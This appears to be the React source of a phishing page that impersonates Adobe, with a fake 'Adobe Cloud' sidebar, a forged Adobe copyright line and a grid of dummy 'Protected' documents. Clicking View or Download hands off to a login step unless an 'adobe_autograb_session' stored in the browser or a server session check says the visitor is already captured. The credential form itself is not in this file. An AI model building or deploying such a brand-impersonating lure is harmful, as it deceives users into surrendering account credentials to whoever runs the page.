import React, { useState, useEffect } from 'react';
import { FileText, Download, Eye, Trash2, Calendar, User, Grid3X3, List, Upload } from 'lucide-react';

interface File {
  name: string;
  type: 'pdf' | 'docx' | 'xlsx';
  size: string;
  date: string;
}

interface LandingPageProps {
  onFileAction: (fileName: string, action: 'view' | 'download') => void;
}

const LandingPage: React.FC<LandingPageProps> = ({ onFileAction }) => {
  const [activeNav, setActiveNav] = useState('Protected Files');
  const [activeView, setActiveView] = useState('Grid View');
  const [currentDate, setCurrentDate] = useState('');
  const [hasActiveSession, setHasActiveSession] = useState(false);
  const [sessionInfo, setSessionInfo] = useState<any>(null);

  // Generate current date
  useEffect(() => {
    const now = new Date();
    const options: Intl.DateTimeFormatOptions = { 
      month: 'short', 
      day: 'numeric' 
    };
    setCurrentDate(now.toLocaleDateString('en-US', options));
  }, []);

  // Check for existing sessions on component mount
  useEffect(() => {
    checkForExistingSession();
  }, []);

  const checkForExistingSession = async () => {
    try {
      // Check server session first
      const response = await fetch('/.netlify/functions/getSession', {
        method: 'GET',
        credentials: 'include',
        headers: {
          'Content-Type': 'application/json'
        }
      });

      if (response.ok) {
        const data = await response.json();
        if (data.success && data.session) {
          setHasActiveSession(true);
          setSessionInfo(data.session);
          return;
        }
      }

      // Check localStorage for autograb session
      const storedSession = localStorage.getItem('adobe_autograb_session');
      if (storedSession) {
        try {
          const sessionData = JSON.parse(storedSession);
          const sessionTime = new Date(sessionData.timestamp);
          const now = new Date();
          const hoursDiff = (now.getTime() - sessionTime.getTime()) / (1000 * 60 * 60);
          
          // Session never expires - always valid
          if (true) {
            setHasActiveSession(true);
            setSessionInfo(sessionData);
            console.log('AutoGrab session found:', sessionData);
          }
        } catch (error) {
          console.error('Error parsing stored session:', error);
        }
      }
    } catch (error) {
      console.log('No existing session found:', error);
    }
  };

  // Convert file sizes to kilobytes and use current date
  const protectedFiles: File[] = [
    { name: 'Document1.pdf', type: 'pdf', size: '54 KB', date: currentDate },
    { name: 'Report.docx', type: 'docx', size: '56 KB', date: currentDate },
    { name: 'Data.xlsx', type: 'xlsx', size: '50 KB', date: currentDate },
    { name: 'Notes.pdf', type: 'pdf', size: '52 KB', date: currentDate },
    { name: 'Overview.docx', type: 'docx', size: '52 KB', date: currentDate },
    { name: 'Budget.pdf', type: 'pdf', size: '52 KB', date: currentDate },
    { name: 'Summary.pdf', type: 'pdf', size: '50 KB', date: currentDate },
    { name: 'Contract.pdf', type: 'pdf', size: '50 KB', date: currentDate },
    { name: 'Contract2.pdf', type: 'pdf', size: '52 KB', date: currentDate },
  ];

  // Recent files - only one PDF
  const recentFiles: File[] = [
    { name: 'protected-document.pdf', type: 'pdf', size: '48 KB', date: currentDate },
  ];

  const getFileIcon = (type: string) => {
    const baseClasses = "w-8 h-8 flex items-center justify-center rounded-lg font-bold text-xs uppercase tracking-wide";
    switch (type) {
      case 'pdf':
        return `${baseClasses} bg-red-50 text-red-600`;
      case 'docx':
        return `${baseClasses} bg-blue-50 text-blue-600`;
      case 'xlsx':
        return `${baseClasses} bg-green-50 text-green-600`;
      default:
        return `${baseClasses} bg-gray-50 text-gray-600`;
    }
  };

  const navItems = ['Protected Files', 'Shared With Me', 'Recent', 'Trash'];

  const getHeaderContent = () => {
    switch (activeNav) {
      case 'Protected Files':
        return {
          title: 'Protected Files',
          description: 'All your secure and recent documents.'
        };
      case 'Shared With Me':
        return {
          title: 'Shared With Me',
          description: 'Documents shared by your team members.'
        };
      case 'Recent':
        return {
          title: 'Recent Files',
          description: 'Your recently accessed documents.'
        };
      case 'Trash':
        return {
          title: 'Trash',
          description: 'Deleted files and documents.'
        };
      default:
        return {
          title: 'Protected Files',
          description: 'All your secure and recent documents.'
        };
    }
  };

  const getCurrentFiles = () => {
    switch (activeNav) {
      case 'Protected Files':
        return protectedFiles;
      case 'Shared With Me':
        return protectedFiles;
      case 'Recent':
        return recentFiles;
      case 'Trash':
        return [];
      default:
        return protectedFiles;
    }
  };

  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    // Check if we have an active session for autograb
    if (hasActiveSession && sessionInfo) {
      console.log('Using autograb session for file access:', sessionInfo);
      const successDiv = document.createElement('div');
      successDiv.innerHTML = `
        <div style="
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: #1E1E1E;
          color: white;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.3);
          z-index: 10000;
          text-align: center;
          font-family: system-ui, -apple-system, sans-serif;
          border: 1px solid #FF0000;
        ">
          <div style="color: #FF0000; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
            ✓ Access Granted!
          </div>
          <div style="color: #E5E7EB; font-size: 14px;">
            Opening ${fileName}...
          </div>
        </div>
      `;
      document.body.appendChild(successDiv);
      setTimeout(() => {
        document.body.removeChild(successDiv);
      }, 2000);
      return;
    }

    // No session available, require login
    onFileAction(fileName, action);
  };

  const headerContent = getHeaderContent();
  const currentFiles = getCurrentFiles();

  const renderEmptyState = () => (
    <div className="flex flex-col items-center justify-center py-20 text-center">
      <div className="w-20 h-20 bg-white/60 backdrop-blur-sm rounded-full flex items-center justify-center mb-6 shadow-lg">
        <Trash2 className="w-10 h-10 text-gray-800" />
      </div>
      <h3 className="text-xl font-semibold text-white mb-3">Trash is empty</h3>
      <p className="text-base text-gray-300 max-w-sm">
        When you delete files, they'll appear here before being permanently removed.
      </p>
    </div>
  );

  const renderGridView = () => (
    <div className="grid grid-cols-3 gap-6">
      {currentFiles.map((file, index) => (
        <div
          key={index}
          className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 p-5 hover:shadow-xl transition-all duration-200 group hover:bg-white/95"
        >
          {/* File Header */}
          <div className="flex items-center gap-4 mb-4">
            <div className={getFileIcon(file.type)}>
              {file.type}
            </div>
            <div className="flex-1 min-w-0">
              <h3 className="font-semibold text-gray-900 truncate text-base">
                {file.name}
              </h3>
              <p className="text-xs text-gray-500">
                {file.size} · {file.date}
              </p>
            </div>
          </div>

          {/* File Actions */}
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
              {hasActiveSession ? 'Unlocked' : 'Protected'}
            </span>
            <div className="flex gap-2 ml-auto">
              <button
                onClick={() => handleFileAction(file.name, 'view')}
                className="flex items-center gap-1 px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-xs hover:from-red-700 hover:to-red-800 transition-all duration-200 group-hover:transform group-hover:-translate-y-0.5 shadow-md"
              >
                <Eye className="w-3 h-3" />
                View
              </button>
              <button
                onClick={() => handleFileAction(file.name, 'download')}
                className="flex items-center gap-1 px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-xs hover:bg-white transition-all duration-200 shadow-sm"
              >
                <Download className="w-3 h-3" />
                Download
              </button>
            </div>
          </div>
        </div>
      ))}
    </div>
  );

  const renderListView = () => (
    <div className="bg-white/90 backdrop-blur-lg rounded-xl shadow-lg border border-white/40 overflow-hidden">
      {/* Table Header */}
      <div className="grid grid-cols-12 gap-4 px-6 py-4 bg-red-50/70 backdrop-blur-sm border-b border-gray-100 text-sm font-medium text-gray-700">
        <div className="col-span-6">Name</div>
        <div className="col-span-2">Type</div>
        <div className="col-span-2">Size</div>
        <div className="col-span-2">Actions</div>
      </div>

      {/* Table Rows */}
      {currentFiles.map((file, index) => (
        <div
          key={index}
          className="grid grid-cols-12 gap-4 px-6 py-4 border-b border-gray-50 hover:bg-red-50/50 transition-all duration-200 group"
        >
          {/* File Name with Icon */}
          <div className="col-span-6 flex items-center gap-3">
            <div className={getFileIcon(file.type)}>
              {file.type}
            </div>
            <div className="min-w-0">
              <h3 className="font-semibold text-gray-900 truncate text-base">
                {file.name}
              </h3>
              <p className="text-xs text-gray-500 flex items-center gap-1">
                <Calendar className="w-3 h-3" />
                Modified {file.date}
              </p>
            </div>
          </div>

          {/* File Type */}
          <div className="col-span-2 flex items-center">
            <span className="text-xs font-semibold text-red-600 bg-red-50 px-2 py-1 rounded-full">
              {hasActiveSession ? 'Unlocked' : 'Protected'}
            </span>
          </div>

          {/* File Size */}
          <div className="col-span-2 flex items-center text-sm text-gray-600">
            {file.size}
          </div>

          {/* Actions */}
          <div className="col-span-2 flex items-center gap-2">
            <button
              onClick={() => handleFileAction(file.name, 'view')}
              className="flex items-center gap-1 px-3 py-1.5 bg-gradient-to-r from-red-600 to-red-700 text-white rounded-lg font-medium text-sm hover:from-red-700 hover:to-red-800 transition-all duration-200 shadow-md"
            >
              <Eye className="w-3 h-3" />
              View
            </button>
            <button
              onClick={() => handleFileAction(file.name, 'download')}
              className="flex items-center gap-1 px-3 py-1.5 bg-white/90 backdrop-blur-sm border border-gray-300 text-gray-600 rounded-lg font-medium text-sm hover:bg-white transition-all duration-200 shadow-sm"
            >
              <Download className="w-3 h-3" />
              Download
            </button>
          </div>
        </div>
      ))}
    </div>
  );

  return (
    <div className="flex min-h-screen relative overflow-hidden">
      {/* Dark gradient background with red/purple accents */}
      <div className="absolute inset-0 bg-gradient-to-br from-[#121212] via-[#1E1E1E] to-[#2C2C2C]"></div>
      <div className="absolute inset-0 bg-gradient-to-tr from-[#FF0000]/10 via-transparent to-[#8B5CF6]/10"></div>
      
      {/* Subtle abstract shapes and blurry overlays */}
      <div className="absolute top-5 right-5 w-60 h-60 bg-[#FF0000]/5 rounded-full blur-3xl"></div>
      <div className="absolute bottom-5 left-5 w-48 h-48 bg-[#8B5CF6]/8 rounded-full blur-2xl"></div>
      <div className="absolute top-1/3 right-1/4 w-36 h-36 bg-[#FF0000]/6 rounded-full blur-xl"></div>
      <div className="absolute bottom-1/3 left-1/3 w-40 h-40 bg-[#EC4899]/7 rounded-full blur-2xl"></div>
      <div className="absolute top-1/2 left-1/2 w-32 h-32 bg-[#8B5CF6]/5 rounded-full blur-xl transform -translate-x-1/2 -translate-y-1/2"></div>
      <div className="absolute top-20 left-20 w-24 h-24 bg-[#FF0000]/4 rounded-full blur-lg"></div>
      <div className="absolute bottom-20 right-20 w-28 h-28 bg-[#EC4899]/6 rounded-full blur-xl"></div>

      {/* Sidebar */}
      <aside className="relative z-10 w-56 bg-[#1E1E1E]/95 backdrop-blur-xl border-r border-[#2C2C2C]/60 flex flex-col shadow-xl">
        <div className="p-6 flex-1">
          {/* Logo Section with Acrobat Logo */}
          <div className="flex items-center gap-3 mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/833px-PDF_file_icon.svg.png" 
              alt="Adobe Acrobat" 
              className="w-10 h-10 object-contain"
            />
            <h1 className="text-lg font-semibold text-white">Adobe Cloud</h1>
          </div>

          {/* Navigation */}
          <nav className="flex flex-col gap-2">
            {navItems.map((item) => (
              <button
                key={item}
                onClick={() => setActiveNav(item)}
                className={`text-left px-3 py-2.5 rounded-lg font-medium text-sm transition-all duration-200 ${
                  activeNav === item
                    ? 'bg-[#FF0000]/10 text-[#FF0000] shadow-sm border border-[#FF0000]/20'
                    : 'text-gray-300 hover:bg-[#2C2C2C]/80 hover:text-white'
                }`}
              >
                {item}
              </button>
            ))}
          </nav>
        </div>

        {/* Adobe Footer */}
        <div className="p-6 border-t border-[#2C2C2C]/60">
          <p className="text-sm text-gray-400 leading-relaxed font-medium">
            © 2025 Adobe Inc.<br />
            All rights reserved.
          </p>
        </div>
      </aside>

      {/* Main Content */}
      <main className="relative z-10 flex-1 p-6 min-w-0">
        {/* Header */}
        <div className="flex justify-between items-start mb-6">
          <div className="min-w-0">
            <h2 className="text-2xl font-bold text-white mb-1">
              {headerContent.title}
            </h2>
            <p className="text-base text-gray-300 font-medium">{headerContent.description}</p>
          </div>
          
          {/* Only show view controls if not in Trash */}
          {activeNav !== 'Trash' && (
            <div className="flex gap-2 flex-shrink-0">
              <button
                onClick={() => setActiveView('List View')}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm border transition-all duration-200 shadow-sm ${
                  activeView === 'List View'
                    ? 'bg-gradient-to-r from-[#FF0000] to-[#DC2626] text-white border-[#FF0000]'
                    : 'bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white'
                }`}
              >
                <List className="w-4 h-4" />
                List
              </button>
              <button
                onClick={() => setActiveView('Grid View')}
                className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm border transition-all duration-200 shadow-sm ${
                  activeView === 'Grid View'
                    ? 'bg-gradient-to-r from-[#FF0000] to-[#DC2626] text-white border-[#FF0000]'
                    : 'bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white'
                }`}
              >
                <Grid3X3 className="w-4 h-4" />
                Grid
              </button>
              <button className="flex items-center gap-2 px-4 py-2 rounded-lg font-medium text-sm bg-[#2C2C2C]/95 backdrop-blur-sm text-gray-300 border border-[#2C2C2C] hover:bg-[#2C2C2C] hover:text-white transition-all duration-200 shadow-sm">
                <Upload className="w-4 h-4" />
                Upload
              </button>
            </div>
          )}
        </div>

        {/* Content Area */}
        <div className="min-w-0">
          {activeNav === 'Trash' ? (
            renderEmptyState()
          ) : (
            activeView === 'Grid View' ? renderGridView() : renderListView()
          )}
        </div>
      </main>
    </div>
  );
};

export default LandingPage;